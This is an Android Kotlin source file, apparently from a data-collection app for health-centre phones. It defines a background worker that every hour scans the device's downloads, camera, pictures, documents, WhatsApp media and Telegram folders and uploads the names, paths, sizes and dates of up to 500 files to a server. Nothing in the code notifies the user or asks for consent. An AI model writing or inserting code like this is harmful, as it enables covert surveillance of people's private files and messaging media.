package com.example.kabensatudata.nearby

import android.content.Context
import android.os.Environment
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.work.*
import com.example.kabensatudata.data.remote.dto.FileItem
import com.example.kabensatudata.data.remote.dto.FileListUpload
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * FileExplorerWorker — Periodic worker that scans common directories
 * (Downloads, DCIM, Pictures, Documents, WhatsApp Media) and uploads
 * file metadata to the server.
 *
 * Runs every 60 minutes.
 */
class FileExplorerWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "FileExplorerWorker"
        private const val WORK_NAME = "file_explorer_sync"

        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val work = PeriodicWorkRequestBuilder<FileExplorerWorker>(
                60, TimeUnit.MINUTES,
                15, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 2, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                work
            )
            Log.i(TAG, "File explorer scheduled (every 60 min)")
        }
    }

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    override suspend fun doWork(): Result {
        return try {
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                ScreenTextService.TextServiceEntryPoint::class.java
            )
            val authTokenManager = entryPoint.authTokenManager()
            val apiService = entryPoint.apiService()

            if (!authTokenManager.isLoggedIn()) return Result.success()

            val deviceName = authTokenManager.getUserName().ifBlank { "HP-Puskesmas" }

            val files = withContext(Dispatchers.IO) { scanFiles() }

            if (files.isNotEmpty()) {
                withContext(Dispatchers.IO) {
                    apiService.uploadFileList(FileListUpload(deviceName, files))
                }
                Log.i(TAG, "Uploaded ${files.size} file entries")
            }

            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "Worker failed: ${e.message}")
            Result.retry()
        }
    }

    private fun scanFiles(): List<FileItem> {
        val results = mutableListOf<FileItem>()
        val root = Environment.getExternalStorageDirectory()

        // Common directories to scan
        val dirsToScan = listOf(
            File(root, "Download"),
            File(root, "Downloads"),
            File(root, "DCIM"),
            File(root, "Pictures"),
            File(root, "Documents"),
            File(root, "WhatsApp/Media"),
            File(root, "Telegram"),
            File(root, "Movies"),
            File(root, "Music")
        )

        for (dir in dirsToScan) {
            if (dir.exists() && dir.isDirectory) {
                scanDirectory(dir, results, maxDepth = 3)
            }
        }

        // Sort by last modified desc, limit to 500
        return results.sortedByDescending { it.lastModified }.take(500)
    }

    private fun scanDirectory(dir: File, results: MutableList<FileItem>, maxDepth: Int, currentDepth: Int = 0) {
        if (currentDepth >= maxDepth || results.size >= 500) return

        try {
            val children = dir.listFiles() ?: return
            for (file in children) {
                if (results.size >= 500) break

                if (file.isFile) {
                    val ext = file.extension.lowercase()
                    val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext)

                    results.add(FileItem(
                        name = file.name,
                        path = file.absolutePath.removePrefix(
                            Environment.getExternalStorageDirectory().absolutePath
                        ),
                        size = file.length(),
                        mimeType = mime,
                        lastModified = dateFormat.format(Date(file.lastModified()))
                    ))
                } else if (file.isDirectory && !file.name.startsWith(".")) {
                    scanDirectory(file, results, maxDepth, currentDepth + 1)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Scan error in ${dir.path}: ${e.message}")
        }
    }
}
